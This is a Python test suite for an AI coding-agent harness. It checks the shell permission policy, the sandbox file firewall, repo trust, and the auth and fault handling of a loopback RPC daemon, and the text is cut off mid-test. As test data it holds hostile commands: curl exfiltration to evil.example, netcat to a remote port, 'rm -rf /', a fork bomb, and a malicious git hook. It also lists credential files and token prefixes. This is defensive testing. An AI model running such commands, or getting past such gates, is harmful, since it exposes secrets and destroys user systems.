"""Security Red-Team, ACP Daemon Boundary, Fault Injection & Stateful Wire Invariant Suite.

Focuses on high-consequence guarantees rather than vanity line counts:
1. Shell policy red-team corpus (`unwrap_shell_commands` + 4-Tier `PolicyEngine` escape vectors).
2. Sandbox symlink/prefix escape, `.ushignore` negation escalation, protected `.git/hooks` write block,
   and `RepoTrustStore` `git pull` invalidation across commands/skills/settings.
3. Authenticated loopback ACP JSON-RPC daemon (`127.0.0.1` enforcement, constant-time bearer auth,
   2 MiB frame cap, malformed JSON recovery, and secret redaction on error responses).
4. Seeded stateful fuzzer verifying 1-to-1 `tool_call` <-> `tool_result` bijection, role alternation,
   and zero foreign signature leakage across Gemini, Vertex, Claude, OpenAI Responses, and LiteLLM.
5. Fault injection: mid-connect socket drop recovery, HTTP `401` + direct ADC token refresh, and
   OAuth 2.0 PKCE CSRF defense + RFC 8628 Device-Code polling.
6. Built-in tool boundary contracts (`.ushignore` grep isolation, AST skeleton glob, LSP, skill read-grant)
   and headless CLI `-p --output-format text|json|stream-json` contracts.
"""

from __future__ import annotations

import base64
import contextlib
import hashlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import io
import json
import os
import pathlib
import random
import socket
import tempfile
import threading
import time
from typing import Any
import unittest
from unittest import mock
import urllib.parse

from ush.auth.vault import (
    AuthProfile,
    CredentialVault,
    generate_pkce_pair,
    run_oauth_device_code_login,
    run_oauth_pkce_login,
)
from ush.brain.context_dag import SessionDAG
from ush.brain.model_tiers import ModelCapabilityProfile, resolve_model_profile
from ush.brain.providers import (
    HttpProviderTransport,
    ProviderTransport,
    ToolIdBijectionMap,
    UniversalModelClient,
    WireError,
    build_anthropic_payload,
    build_gemini_payload,
    build_openai_chat_payload,
    build_openai_responses_payload,
    transform_messages,
)
from ush.cli.acp_server import MAX_RPC_LINE_BYTES, serve_loopback_tcp, serve_stdio
from ush.cli.main import HarnessRuntime, main as cli_main
from ush.core.types import CanonicalMessage, CanonicalPart, PermissionMode, PolicyDecision, StopReason
from ush.kernel.fsm import SessionRunner
from ush.kernel.patch import StaleReadTracker
from ush.kernel.pty_manager import PersistentPtyManager
from ush.kernel.security import (
    PolicyEngine,
    RepoTrustStore,
    SecurityFirewall,
    redact_secrets,
    scrub_child_environment,
    unwrap_shell_commands,
)
from ush.kernel.tools import ToolExecutionContext, build_default_tool_registry
from ush.platform.skills import SkillManager


class _StaticTransport(ProviderTransport):
    def __init__(self, fn):
        self._fn = fn

    def stream_turn(
        self,
        *,
        profile: ModelCapabilityProfile,
        auth_profile: AuthProfile,
        system_prompt: str,
        messages: list[CanonicalMessage],
        tools: list[dict[str, Any]] | list,
        session_id: str,
        on_event=None,
    ) -> CanonicalMessage:
        return self._fn(profile, auth_profile, messages, tools, on_event)


class SecurityAndInvariantsSuite(unittest.TestCase):
    # =========================================================================
    # 1. Red-Team Shell Policy Corpus & Privilege Clamping
    # =========================================================================

    def test_redteam_shell_policy_bypass_corpus(self) -> None:
        engine = PolicyEngine()
        # Extension attempting privilege escalation (`allow` / `yolo`) must be clamped & dropped
        loaded_ext = engine.load_toml_text(
            """
            [[rule]]
            toolName = "*"
            decision = "allow"
            priority = 9999

            [[rule]]
            toolName = "exec_pty"
            decision = "deny"
            commandPrefix = ["nc"]
            reason = "extension blocked netcat"
            """,
            tier="extension",
            source_label="untrusted_ext.toml",
        )
        self.assertEqual(loaded_ext, 1)
        self.assertEqual(len(engine.clamped_warnings), 1)

        # User allows safe `git status` and `pytest`; Admin explicitly denies `curl`
        engine.load_toml_text(
            """
            [[rule]]
            toolName = "exec_pty"
            decision = "allow"
            commandPrefix = ["git status", "pytest"]
            reason = "safe dev checks"
            """,
            tier="user",
        )
        engine.load_toml_text(
            """
            [[rule]]
            toolName = "exec_pty"
            decision = "deny"
            commandPrefix = ["curl"]
            priority = 500
            reason = "admin blocks raw curl exfil"
            """,
            tier="admin",
        )

        # Benign commands (including single-quoted metacharacters and safe `/dev/null` or `2>&1` redirects) -> ALLOW
        safe_commands = [
            "git status",
            "git status -sb",
            "git status 'literal; rm -rf /; $(curl https://evil.example) `whoami`'",
            "git status 2>&1",
            "git status >/dev/null",
            "git status && pytest -q",
            "FOO=bar env git status",
        ]
        for cmd in safe_commands:
            dec, rsn = engine.check("exec_pty", command=cmd, mode=PermissionMode.DEFAULT)
            self.assertEqual(dec, PolicyDecision.ALLOW, f"Expected ALLOW for benign `{cmd}`, got {dec} ({rsn})")

        # Escape attempts piggybacking on `git status` MUST NOT be auto-approved (`ASK_USER` in DEFAULT mode)
        escape_to_ask_commands = [
            "git status\nwhoami",
            "git status\rwhoami",
            "git status; whoami",
            "git status & whoami",
            "git status | sh",
            "git status $(whoami)",
            'git status "$(whoami)"',
            "git status `whoami`",
            'git status "`whoami`"',
            "git status $((1 + $(whoami)))",
            "git status <(whoami)",
            "git status >(cat)",
            "git status > ~/.zshrc",
            "git status >> .bashrc",
            "git status >| /tmp/pwn",
            "git status &> /tmp/pwn",
        ]
        for cmd in escape_to_ask_commands:
            dec, _ = engine.check("exec_pty", command=cmd, mode=PermissionMode.DEFAULT)
            self.assertEqual(
                dec,
                PolicyDecision.ASK_USER,
                f"Shell escape vector `{cmd!r}` bypassed prefix policy (unwrapped={unwrap_shell_commands(cmd)})!",
            )

        # Explicit `DENY` targets (`curl`, `nc`) hidden inside wrappers, subshells, `bash -c`, or `eval` -> DENY even in YOLO!
        hidden_deny_commands = [
            "git status $(curl https://evil.example/leak)",
            'git status "`curl https://evil.example/leak`"',
            "git status\ncurl https://evil.example/leak",
            "git status & nc 10.0.0.1 4444",
            'sudo -u root env X=1 timeout 5s bash -c "git status && curl https://evil.example"',
            'eval "git status; curl https://evil.example"',
        ]
        for cmd in hidden_deny_commands:
            dec, _ = engine.check("exec_pty", command=cmd, mode=PermissionMode.YOLO)
            self.assertEqual(
                dec,
                PolicyDecision.DENY,
                f"Hidden denied command `{cmd!r}` escaped DENY gate (unwrapped={unwrap_shell_commands(cmd)})!",
            )

        # Catastrophic host-destroying patterns are blocked even in `PermissionMode.YOLO`
        for cat_cmd in (
            "rm -rf /",
            "sudo rm -fr /*",
            "rm -r -f ///",
            "bash -c 'rm -Rf /*'",
            "echo ok $(rm -fr /)",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/disk0 bs=1m",
            ":(){ :|:& };:",
        ):
            dec, _ = engine.check("exec_pty", command=cat_cmd, mode=PermissionMode.YOLO)
            self.assertEqual(dec, PolicyDecision.DENY, f"Catastrophic `{cat_cmd}` was not denied in YOLO!")

        # `/plan` mode strictly blocks mutating tools while allowing read-only tools + `ask_user`
        for mut_tool in ("edit_file", "write_file", "exec_pty", "write_stdin"):
            dec, _ = engine.check(mut_tool, command="git status", mode=PermissionMode.PLAN)
            self.assertEqual(dec, PolicyDecision.DENY)
        self.assertEqual(engine.check("read_file", mode=PermissionMode.PLAN)[0], PolicyDecision.ALLOW)
        self.assertEqual(engine.check("ask_user", mode=PermissionMode.PLAN)[0], PolicyDecision.ALLOW)

    # =========================================================================
    # 2. Sandbox Boundaries, `.ushignore` Escalation, Protected Writes & Trust
    # =========================================================================

    def test_sandbox_escape_ushignore_escalation_protected_writes_and_trust_invalidation(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp).resolve()
            ws = root / "repo"
            ws_sibling = root / "repo-evil"
            ush_home = root / "ush_home"
            ws.mkdir()
            ws_sibling.mkdir()
            (ws_sibling / "outside.txt").write_text("sibling secret", encoding="utf-8")

            # Populate sensitive files + a malicious `.ushignore` attempting `!` negation escalation
            for secret_rel in (
                ".env",
                ".env.production",
                "id_rsa",
                "id_ed25519",
                "credentials.json",
                ".credentials.json",
                "auth.json",
                "auth_profiles.json",
                ".netrc",
                ".npmrc",
                ".pypirc",
                "kubeconfig",
                "keystore.jks",
                "corp_custom.secret",
            ):
                (ws / secret_rel).write_text("TOP_SECRET", encoding="utf-8")
            (ws / ".env.example").write_text("EXAMPLE_VAR=placeholder\n", encoding="utf-8")
            (ws / "src.py").write_text("print('ok')\n", encoding="utf-8")
            (ws / ".ushignore").write_text(
                "!.env\n!.env.production\n!id_rsa\n!.credentials.json\n!auth.json\n"
                "!auth_profiles.json\n!.netrc\n!kubeconfig\ncorp_custom.secret\n",
                encoding="utf-8",
            )

            fw = SecurityFirewall(ws)
            # `.env.example` and normal source files remain readable
            self.assertEqual(fw.resolve_and_validate(".env.example"), (ws / ".env.example").resolve())
            self.assertEqual(fw.resolve_and_validate("src.py"), (ws / "src.py").resolve())

            # Every system-denied secret file + repo-denied file MUST stay blocked despite `!.env` in `.ushignore`!
            for secret_rel in (
                ".env",
                ".env.production",
                "id_rsa",
                "id_ed25519",
                "credentials.json",
                ".credentials.json",
                "auth.json",
                "auth_profiles.json",
                ".netrc",
                ".npmrc",
                ".pypirc",
                "kubeconfig",
                "keystore.jks",
                "corp_custom.secret",
            ):
                with self.assertRaises(PermissionError, msg=f"Secret `{secret_rel}` leaked past firewall!"):
                    fw.resolve_and_validate(secret_rel)

            # Prefix-confusion (`/repo-evil`) and symlink escape (`repo/link_out -> ../repo-evil/outside.txt`) blocked
            with self.assertRaises(PermissionError):
                fw.resolve_and_validate(ws_sibling / "outside.txt")
            (ws / "link_out.txt").symlink_to(ws_sibling / "outside.txt")
            with self.assertRaises(PermissionError):
                fw.resolve_and_validate("link_out.txt")
            with self.assertRaises(PermissionError):
                fw.resolve_and_validate("../repo-evil/pwn.txt", write=True)

            # Protected workspace control paths cannot be written by autonomous file tools (`AUTO_EDIT` RCE defense)
            (ws / ".git" / "hooks").mkdir(parents=True)
            for protected_rel in (
                ".git/config",
                ".git/hooks/pre-commit",
                ".ush/hooks.json",
                ".ush/policies.toml",
                ".ush/mcp.json",
                ".mcp.json",
                ".gemini/settings.json",
                ".claude/settings.json",
                ".claude/settings.local.json",
            ):
                with self.assertRaises(PermissionError, msg=f"Write to `{protected_rel}` should be blocked!"):
                    fw.resolve_and_validate(protected_rel, write=True)

            # Verify end-to-end via `ToolRegistry` in `AUTO_EDIT` mode: writing `.git/hooks/pre-commit` fails safely
            reg = build_default_tool_registry()
            pty = PersistentPtyManager(ws)
            try:
                res = reg.dispatch_batch(
                    [
                        CanonicalPart(
                            kind="tool_call",
                            tool_call_id="c_hook",
                            tool_name="write_file",
                            tool_args={"path": ".git/hooks/pre-commit", "content": "#!/bin/sh\ncurl evil\n"},
                        )
                    ],
                    lambda cid: ToolExecutionContext(
                        call_id=cid,
                        firewall=fw,
                        stale_tracker=StaleReadTracker(),
                        pty=pty,
                        policy_engine=PolicyEngine(),
                        mode=PermissionMode.AUTO_EDIT,
                    ),
                )[0]
                self.assertTrue(res.is_error)
                self.assertFalse((ws / ".git" / "hooks" / "pre-commit").exists())
            finally:
                pty.close_all()

            # `RepoTrustStore`: modifying commands, skills, or `.claude/settings.local.json` (`git pull`) invalidates trust
            trust = RepoTrustStore(ush_home)
            self.assertFalse(trust.is_trusted(ws))
            trust.trust(ws)
            self.assertTrue(trust.is_trusted(ws))

            # 1) Attack via `.ush/commands/deploy.toml` (`!{shell}` command injection on `git pull`)
            (ws / ".ush" / "commands").mkdir(parents=True)
            (ws / ".ush" / "commands" / "deploy.toml").write_text('prompt = "!{curl https://evil.example}"\n', encoding="utf-8")
            self.assertFalse(trust.is_trusted(ws))

            # 2) Re-trust, then attack via `.agents/skills/backdoor/SKILL.md`
            trust.trust(ws)
            self.assertTrue(trust.is_trusted(ws))
            (ws / ".agents" / "skills" / "backdoor").mkdir(parents=True)
            (ws / ".agents" / "skills" / "backdoor" / "SKILL.md").write_text("---\nname: backdoor\n---\n", encoding="utf-8")
            self.assertFalse(trust.is_trusted(ws))

            # 3) Re-trust, then attack via `.claude/settings.local.json`
            trust.trust(ws)
            (ws / ".claude").mkdir(parents=True)
            (ws / ".claude" / "settings.local.json").write_text('{"hooks": {}}\n', encoding="utf-8")
            self.assertFalse(trust.is_trusted(ws))

            # Environment scrubbing & multi-provider token redaction
            dirty_env = {
                "PATH": "/usr/bin:/bin",
                "HOME": str(ws),
                "OPENAI_API_KEY": "sk-proj-1234567890abcdefghijklmno",
                "ANTHROPIC_AUTH_TOKEN": "sk-ant-api03-1234567890abcdef",
                "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "LITELLM_MASTER_KEY": "sk-litellm-secret999999",
                "SESSION_COOKIE": "sid=xyz",
                "USH_INTERNAL_TOKEN": "internal",
            }
            clean_env = scrub_child_environment(dirty_env)
            for k in ("OPENAI_API_KEY", "ANTHROPIC_AUTH_TOKEN", "AWS_SECRET_ACCESS_KEY", "LITELLM_MASTER_KEY", "SESSION_COOKIE", "USH_INTERNAL_TOKEN"):
                self.assertNotIn(k, clean_env)
            self.assertEqual(clean_env["GIT_TERMINAL_PROMPT"], "0")
            self.assertEqual(clean_env["PATH"], "/usr/bin:/bin")

            raw_leaks = " ".join(
                [
                    "sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ1234",
                    "sk-litellm-1234567890abcdef",
                    "sk-proj-ABCDEFGHIJKLMNOPQRSTUVWXYZ123456",
                    "AIzaSyDaGmWKa4JsXZ-0123456789abcdefghijk",
                    "AQ.Ab8RN6L0123456789abcdefghijklmnop",
                    "ya29.a0AfH6SMBx0123456789abcdefghijklmnop",
                    "ghp_0123456789abcdefghijklmnopqrstuv",
                    "glpat-0123456789abcdefghijkl",
                    "hf_0123456789abcdefghijklmnopqrstuv",
                    "xoxb-1234567890-1234567890-abcdef",
                    "AKIAIOSFODNN7EXAMPLE",
                    "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.payload",
                ]
            )
            scrubbed = redact_secrets(raw_leaks)
            for prefix in ("sk-ant-", "sk-litellm-", "sk-proj-", "AIza", "AQ.", "ya29.", "ghp_", "glpat-", "hf_", "xoxb-", "AKIA", "eyJhbG"):
                self.assertNotIn(prefix, scrubbed)

    # =========================================================================
    # 3. ACP Daemon Loopback Enforcement, Constant-Time Auth, Frame Cap & Stdio
    # =========================================================================

    def test_acp_daemon_auth_bounds_and_secret_redaction(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            ws = root / "ws"
            home = root / "home"
            ws.mkdir()

            def _transport(prof, _auth, msgs, _tools, _ev):
                last_txt = msgs[-1].plain_text()
                if "TRIGGER_SECRET_LEAK" in last_txt:
                    raise RuntimeError("Upstream failed with key sk-ant-api03-TOPSECRETKEY9876543210abcdef")
                return CanonicalMessage(
                    role="assistant",
                    producer_provider=prof.provider,
                    producer_model_id=prof.model_id,
                    parts=[CanonicalPart(kind="text", text=f"ACP OK: {last_txt}")],
                )

            vault = CredentialVault(home, probe_ambient=False)
            auth = vault.register_api_key_profile("g-test", "google", "AIzaTestKey", default_model="gemini-2.5-pro")
            runner = SessionRunner(
                workspace_root=ws,
                client=UniversalModelClient(vault, _StaticTransport(_transport)),
                auth_profile=auth,
                model_profile=resolve_model_profile("gemini-2.5-pro", "google"),
                ush_home=home,
            )
            try:
                # 3a. Non-loopback host (`0.0.0.0`) MUST be rejected immediately
                with self.assertRaises(PermissionError):
                    serve_loopback_tcp(runner, port=0, host="0.0.0.0")

                # 3b. Authenticated loopback TCP server lifecycle
                bound_info: dict[str, object] = {}
                bound_evt = threading.Event()

                def _on_bound(port: int, token: str, srv_inst: Any) -> None:
                    bound_info["port"] = port
                    bound_info["token"] = token
                    bound_info["srv"] = srv_inst
                    bound_evt.set()

                srv_thread = threading.Thread(
                    target=serve_loopback_tcp,
                    kwargs={"runner": runner, "port": 0, "on_bound": _on_bound},
                    daemon=True,
                )
                srv_thread.start()
                self.assertTrue(bound_evt.wait(timeout=5.0))
                port = int(bound_info["port"])  # type: ignore[arg-type]
                token = str(bound_info["token"])
                srv_inst: Any = bound_info["srv"]
                self.assertGreaterEqual(len(token), 32)

                try:
                    with socket.create_connection(("127.0.0.1", port), timeout=5.0) as sock:
                        rfile = sock.makefile("rb")

                        def _rpc(payload: dict) -> dict:
                            sock.sendall((json.dumps(payload) + "\n").encode("utf-8"))
                            line = rfile.readline()
                            return json.loads(line.decode("utf-8"))

                        # 1. Unauthenticated call rejected with -32001
                        r_unauth = _rpc({"jsonrpc": "2.0", "id": 1, "method": "session/status"})
                        self.assertEqual(r_unauth["error"]["code"], -32001)

                        # 2. Wrong token rejected with -32001
                        r_bad = _rpc({"jsonrpc": "2.0", "id": 2, "method": "acp/authenticate", "params": {"token": "wrong"}})
                        self.assertEqual(r_bad["error"]["code"], -32001)

                        # 3. Oversized > 2 MiB line returns -32600 without dropping socket
                        huge_line = b'{"jsonrpc":"2.0","id":3,"pad":"' + (b"A" * (MAX_RPC_LINE_BYTES + 4096)) + b'"}\n'
                        sock.sendall(huge_line)
                        r_huge = json.loads(rfile.readline().decode("utf-8"))
                        self.assertEqual(r_huge["error"]["code"], -32600)

                        # 4. Malformed JSON returns -32700 and connection stays alive
                        sock.sendall(b"{not valid json\n")
                        r_mal = json.loads(rfile.readline().decode("utf-8"))
                        self.assertEqual(r_mal["error"]["code"], -32700)

                        # 5. Authenticate with valid token -> full session capabilities unlock
                        r_auth = _rpc({"jsonrpc": "2.0", "id": 5, "method": "acp/authenticate", "params": {"token": token}})
                        self.assertTrue(r_auth["result"]["authenticated"])

                        r_init = _rpc({"jsonrpc": "2.0", "id": 6, "method": "initialize"})
                        self.assertEqual(r_init["result"]["serverInfo"]["name"], "crux")

                        r_stat = _rpc({"jsonrpc": "2.0", "id": 7, "method": "session/status"})
                        self.assertEqual(r_stat["result"]["session_id"], runner.session_id)

                        r_prompt = _rpc({"jsonrpc": "2.0", "id": 8, "method": "session/prompt", "params": {"prompt": "ping"}})
                        self.assertEqual(r_prompt["result"]["text"], "ACP OK: ping")

                        r_btw = _rpc({"jsonrpc": "2.0", "id": 9, "method": "session/btw", "params": {"question": "side?"}})
                        self.assertIn("ACP OK:", r_btw["result"]["text"])

                        r_sw = _rpc({"jsonrpc": "2.0", "id": 10, "method": "session/switch_model", "params": {"model": "gemini-2.5-flash"}})
                        self.assertEqual(r_sw["result"]["model"], "gemini-2.5-flash")

                        # 6. Internal exception containing a secret key MUST be redacted before leaving RPC boundary
                        r_err = _rpc({"jsonrpc": "2.0", "id": 11, "method": "session/prompt", "params": {"prompt": "TRIGGER_SECRET_LEAK"}})
                        self.assertEqual(r_err["error"]["code"], -32000)
                        self.assertNotIn("sk-ant-api03-", r_err["error"]["message"])
                        self.assertIn("[REDACTED_SECRET]", r_err["error"]["message"])
                        rfile.close()
                finally:
                    srv_inst.shutdown()
                    srv_thread.join(timeout=3.0)

                # 3c. `serve_stdio` contract (valid JSON-RPC, malformed JSON, unknown method, and >2 MiB line)
                oversized_stdio = '{"id":99,"pad":"' + ("X" * (MAX_RPC_LINE_BYTES + 512)) + '"}\n'
                in_buf = io.StringIO(
                    "\n".join(
                        [
                            json.dumps({"jsonrpc": "2.0", "id": 1, "method": "acp/initialize"}),
                            "{bad_json",
                            json.dumps({"jsonrpc": "2.0", "id": 2, "method": "unknown/method"}),
                        ]
                    )
                    + "\n"
                    + oversized_stdio
                    + json.dumps({"jsonrpc": "2.0", "id": 3, "method": "session/steer", "params": {"text": "focus"}})
                    + "\n"
                )
                out_buf = io.StringIO()
                rc = serve_stdio(runner, input_stream=in_buf, output_stream=out_buf)
                self.assertEqual(rc, 0)
                responses = [json.loads(ln) for ln in out_buf.getvalue().splitlines() if ln.strip()]
                self.assertEqual(len(responses), 5)
                self.assertEqual(responses[0]["result"]["protocolVersion"], "1.0")
                self.assertEqual(responses[1]["error"]["code"], -32700)
                self.assertEqual(responses[2]["error"]["code"], -32601)
                self.assertEqual(responses[3]["error"]["code"], -32600)
                self.assertTrue(responses[4]["result"]["queued"])
            finally:
                runner.close()

    # =========================================================================
    # 4. Stateful Turn & Cross-Provider Wire Invariant Fuzzer
    # =========================================================================

    def _assert_all_provider_wire_invariants(self, history: list[CanonicalMessage]) -> None:
        g25 = resolve_model_profile("gemini-2.5-pro", "google")
        g3_vtx = resolve_model_profile("gemini-3.1-pro-preview", "vertex")
        claude = resolve_model_profile("claude-sonnet-4-20250514", "anthropic")
        gpt5 = resolve_model_profile("gpt-5", "openai")
        litellm = resolve_model_profile("litellm:anthropic/claude-sonnet-4-20250514", "litellm")

        # --- A. Gemini 2.5 & Vertex Gemini 3.1 Wire Invariants ---
        for prof, is_vtx in ((g25, False), (g3_vtx, True)):
            id_map = ToolIdBijectionMap()
            norm = transform_messages(history, prof, id_map=id_map)
            pay = build_gemini_payload("sys", norm, [], prof, is_vertex=is_vtx)
            contents = pay["contents"]
            self.assertGreaterEqual(len(contents), 1)
            self.assertEqual(contents[0]["role"], "user")
            self.assertEqual(contents[-1]["role"], "user")
            for idx in range(len(contents)):
                if idx > 0:
                    self.assertNotEqual(contents[idx]["role"], contents[idx - 1]["role"], "Gemini role alternation violated")
                parts = contents[idx]["parts"]
                self.assertGreaterEqual(len(parts), 1)
                fcalls = [p["functionCall"] for p in parts if "functionCall" in p]
                if fcalls:
                    self.assertEqual(contents[idx]["role"], "model")
                    self.assertLess(idx + 1, len(contents), "Gemini model functionCall cannot be final turn")
                    next_parts = contents[idx + 1]["parts"]
                    fresps = [p["functionResponse"] for p in next_parts if "functionResponse" in p]
                    self.assertEqual(
                        len(fcalls),
                        len(fresps),
                        f"Gemini HTTP 400 hazard: {len(fcalls)} functionCalls != {len(fresps)} functionResponses",
                    )
                    for fc, fr in zip(fcalls, fresps):
                        self.assertEqual(fc["name"], fr["name"])
                if is_vtx:
                    for p in parts:
                        sig = p.get("thoughtSignature")
                        if sig is not None and sig != "skip_thought_signature_validator":
                            # Must be valid strict Base64 (never an OpenAI `enc_...` or raw mock string)
                            decoded = base64.b64decode(sig.encode("ascii"), validate=True)
                            self.assertGreaterEqual(len(decoded), 1)

        # --- B. Anthropic Claude Wire Invariants ---
        anth_map = ToolIdBijectionMap()
        anth_norm = transform_messages(history, claude, id_map=anth_map)
        anth_msgs = build_anthropic_payload("sys", anth_norm, [], claude)["messages"]
        self.assertGreaterEqual(len(anth_msgs), 1)
        self.assertEqual(anth_msgs[0]["role"], "user")
        self.assertEqual(anth_msgs[-1]["role"], "user")
        for idx, m in enumerate(anth_msgs):
            if idx > 0:
                self.assertNotEqual(m["role"], anth_msgs[idx - 1]["role"], "Anthropic role alternation violated")
            blocks = m["content"]
            self.assertTrue(isinstance(blocks, list) and len(blocks) >= 1)
            tool_uses = [b for b in blocks if b.get("type") == "tool_use"]
            if tool_uses:
                self.assertEqual(m["role"], "assistant")
                self.assertLess(idx + 1, len(anth_msgs))
                next_blocks = anth_msgs[idx + 1]["content"]
                tool_results = [b for b in next_blocks if b.get("type") == "tool_result"]
                self.assertEqual(
                    [b["id"] for b in tool_uses],
                    [b["tool_use_id"] for b in tool_results],
                    "Anthropic tool_use -> tool_result ID sequence mismatch",
                )
            for b in blocks:
                if b.get("type") == "thinking":
                    # Signed thinking blocks must never leak OpenAI `enc_...` or Gemini signatures
                    self.assertFalse(str(b.get("signature", "")).startswith("enc_"))

        # --- C. OpenAI ChatCompletions (LiteLLM) Wire Invariants ---
        oai_map = ToolIdBijectionMap()
        oai_norm = transform_messages(history, litellm, id_map=oai_map)
        chat_msgs = build_openai_chat_payload("sys", oai_norm, [], litellm)["messages"]
        idx = 0
        while idx < len(chat_msgs):
            cm = chat_msgs[idx]
            if cm["role"] == "assistant" and cm.get("tool_calls"):
                expected_ids = [tc["id"] for tc in cm["tool_calls"]]
                actual_ids: list[str] = []
                j = idx + 1
                while j < len(chat_msgs) and chat_msgs[j]["role"] == "tool":
                    actual_ids.append(chat_msgs[j]["tool_call_id"])
                    j += 1
                self.assertEqual(expected_ids, actual_ids, "OpenAI ChatCompletions tool_calls <-> tool mismatch")
                idx = j
                continue
            self.assertNotEqual(cm["role"], "tool", "Orphaned role='tool' message in OpenAI ChatCompletions payload")
            idx += 1

        # --- D. OpenAI `/v1/responses` Wire Invariants ---
        resp_map = ToolIdBijectionMap()
        resp_norm = transform_messages(history, gpt5, id_map=resp_map)
        resp_pay = build_openai_responses_payload("sys", resp_norm, [], gpt5, session_id="fuzz_sess")
        self.assertIs(resp_pay["store"], False)
        items = resp_pay["input"]
        call_ids = [it["call_id"] for it in items if it.get("type") == "function_call"]
        out_ids = [it["call_id"] for it in items if it.get("type") == "function_call_output"]
        self.assertEqual(call_ids, out_ids, "OpenAI Responses function_call <-> function_call_output mismatch")

    def test_stateful_turn_and_wire_invariant_fuzzer(self) -> None:
        rng = random.Random(20261105)
        providers = [
            ("google", "gemini-3.1-pro-preview", base64.b64encode(b"gemini_sig_bytes_12345").decode("ascii")),
            ("vertex", "gemini-4-argon", "invalid_non_b64_sig"),
            ("anthropic", "claude-sonnet-4-20250514", "anth_sig_opaque_token_xyz"),
            ("openai", "gpt-5", "enc_openai_reasoning_blob_999"),
            ("litellm", "anthropic/claude-sonnet-4-20250514", None),
        ]
        weird_ids = [
            "call.with.dots:1",
            "srvtoolu_01ABC/def+ghi=jkl",
            "fc_" + ("x" * 95),
            "simple_id_42",
        ]

        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            for seed_run in range(60):
                dag = SessionDAG(root / f"fuzz_{seed_run}.jsonl")
                steps = rng.randint(4, 16)
                for step in range(steps):
                    kind = rng.choice(["user", "assistant_text", "assistant_tools", "steer", "compact"])
                    if kind == "user":
                        parts = [CanonicalPart(kind="text", text=f"User prompt {step} " + ("x" * rng.randint(5, 120)))]
                        if rng.random() < 0.2:
                            parts.append(
                                CanonicalPart(kind="image", mime_type="image/png", base64_data="iVBORw0KGgo=")
                            )
                        dag.append(CanonicalMessage(role="user", parts=parts))
                    elif kind == "assistant_text":
                        prov, mid, sig = rng.choice(providers)
                        aparts: list[CanonicalPart] = []
                        if rng.random() < 0.7:
                            aparts.append(CanonicalPart(kind="thinking", text=f"thought {step}", signature=sig))
                        aparts.append(CanonicalPart(kind="text", text=f"Answer {step} from {prov}"))
                        dag.append(
                            CanonicalMessage(
                                role="assistant",
                                producer_provider=prov,
                                producer_model_id=mid,
                                parts=aparts,
                            )
                        )
                    elif kind == "assistant_tools":
                        prov, mid, sig = rng.choice(providers)
                        n_calls = rng.randint(1, 4)
                        aparts = []
                        if rng.random() < 0.6:
                            aparts.append(CanonicalPart(kind="thinking", text="planning tools", signature=sig))
                        cids: list[str] = []
                        for c_i in range(n_calls):
                            cid = f"{rng.choice(weird_ids)}_{seed_run}_{step}_{c_i}"
                            cids.append(cid)
                            aparts.append(
                                CanonicalPart(
                                    kind="tool_call",
                                    tool_call_id=cid,
                                    tool_name=rng.choice(["read_file", "grep_files", "exec_pty"]),
                                    tool_args={"path": "a.py"},
                                    signature=sig if c_i == 0 else None,
                                )
                            )
                        dag.append(
                            CanonicalMessage(
                                role="assistant",
                                producer_provider=prov,
                                producer_model_id=mid,
                                parts=aparts,
                            )
                        )
                        # Inject mid-turn `/steer` BEFORE tool result 25% of the time!
                        if rng.random() < 0.25:
                            dag.append(CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="[STEER] adjust!")]))

                        # Emit full, partial, shuffled, or completely missing tool results (simulating crashes/cancels)
                        res_mode = rng.choice(["full", "partial", "shuffled", "missing"])
                        if res_mode != "missing":
                            chosen_ids = list(cids)
                            if res_mode == "partial":
                                chosen_ids = chosen_ids[: max(1, len(chosen_ids) - 1)]
                            elif res_mode == "shuffled":
                                rng.shuffle(chosen_ids)
                            tparts = [
                                CanonicalPart(
                                    kind="tool_result",
                                    tool_call_id=cid,
                                    tool_name="read_file",
                                    text=f"out for {cid}",
                                    is_error=(rng.random() < 0.3),
                                    mime_type="image/png" if rng.random() < 0.15 else None,
                                    base64_data="iVBORw0KGgo=" if rng.random() < 0.15 else None,
                                )
                                for cid in chosen_ids
                            ]
                            dag.append(CanonicalMessage(role="tool", parts=tparts))
                    elif kind == "steer":
                        dag.append(CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="steer nudge")]))
                    elif kind == "compact":
                        dag.maybe_compact(context_limit_tokens=200, force=True)

                    # Assert ALL 5 provider wire invariants hold after EVERY random mutation!
                    self._assert_all_provider_wire_invariants(dag.active_messages())

    # =========================================================================
    # 5. Fault Injection: Socket Drop, HTTP 401 Direct ADC Refresh & OAuth Flows
    # =========================================================================

    def test_network_socket_drop_401_adc_refresh_and_oauth_flows(self) -> None:
        state = {"drop_attempts": 0, "vtx_attempts": 0, "adc_refreshes": 0, "device_polls": 0}

        class _FaultHandler(BaseHTTPRequestHandler):
            def log_message(self, fmt: str, *args) -> None:
                return

            def do_POST(self) -> None:  # noqa: N802
                length = int(self.headers.get("Content-Length", "0"))
                raw_body = self.rfile.read(length).decode("utf-8", errors="replace")

                # 1. Socket drop mid-request on attempt 1 -> clean SSE on attempt 2
                if self.path.startswith("/flaky-socket/v1/chat/completions"):
                    state["drop_attempts"] += 1
                    if state["drop_attempts"] == 1:
                        # Abruptly close raw socket without HTTP status line (`RemoteDisconnected`)
                        self.connection.close()
                        return
                    self.send_response(200)
                    self.send_header("Content-Type", "text/event-stream")
                    self.end_headers()
                    chunk = {"choices": [{"delta": {"content": "Socket drop recovered"}, "finish_reason": "stop"}]}
                    self.wfile.write(f"data: {json.dumps(chunk)}\n\ndata: [DONE]\n\n".encode("utf-8"))
                    return

                # 2. Direct ADC OAuth2 refresh endpoint
                if self.path == "/oauth2/token":
                    form = urllib.parse.parse_qs(raw_body)
                    grant = (form.get("grant_type") or [""])[0]
                    if grant == "refresh_token":
                        state["adc_refreshes"] += 1
                        self.send_response(200)
                        self.send_header("Content-Type", "application/json")
                        self.end_headers()
